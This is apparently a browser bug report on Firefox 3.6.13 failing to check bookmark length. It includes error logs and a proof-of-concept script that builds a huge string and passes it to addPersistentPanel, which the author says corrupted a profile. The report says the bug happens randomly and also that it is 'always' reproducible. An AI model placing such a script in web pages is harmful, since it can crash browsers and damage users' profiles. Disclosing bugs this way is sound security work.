Not something serious, although quite annoying. I found this back in 2007, but never gave it much after thought. In Firefox the length of a bookmark is not checked in Mozilla <= 3.6.13 Firefox 4 doesn't suffer from it, which is a good thing. But when toying with addPersistentPanel in 3.6.13 I managed to first corrupt my default profile (needed to run CHKDISK to fix it), and currently, after fixing the default profile folder livemarks fail to load:

-----------------------------------
Error: this.livemarks is undefined
Source File: file:///C:/Program%20Files/Mozilla%20Firefox/modules/utils.js
Line: 1053
-----------------------------------
Error: illegal character
Source File: file:///C:/Program%20Files/Mozilla%20Firefox/components/nsLivemarkService.js
Line: 1, Column: 7
----------------------------------
So after restarting Firefox, it's impossible to add bookmarks:
----------------------------------
Error: uncaught exception: [Exception... "Component returned failure code: 0x80040154 (NS_ERROR_FACTORY_NOT_REGISTERED) [nsINavBookmarksService.insertBookmark]"  nsresult: "0x80040154 (NS_ERROR_FACTORY_NOT_REGISTERED)"  location: "JS frame :: file:///C:/Program%20Files/Mozilla%20Firefox/components/nsPlacesTransactionsService.js :: PCIT_doTransaction :: line 478"  data: no]
----------------------------------

Suffice to say that something is going on here. And I need to reinstall Firefox in order to fix this issue.

It seems difficult to reproduce the steps, as it seemed to happen randomly. Note that I am doing a lot of testing, but my hunch is that the problem arose when I added 4 bookmarks with a huge URL, and removing them one by one from my bookmarks.

<script>

var bookmark = "AAAA";
// var bookmark = unescape("%udddd");
// it might be due to unescaped unicode chars?

for(k =0; k <= 655530; k++) {
bookmark +=bookmark;
}

for(j =0; j <= 655530; j++) {
bookmark +=bookmark;
}


bookmark +=bookmark;
bookmark +=bookmark;
bookmark +=bookmark;
bookmark +=bookmark;

window.sidebar.addPersistentPanel(
bookmark,
bookmark,
bookmark);

</script>

Reproducible: Always

Steps to Reproduce:
1. add bookmarks with huge URL's 
2. remove them one by one 
3. it might corrupt your profile.



I recommend to run this on a test box, since it might corrupt your profile.
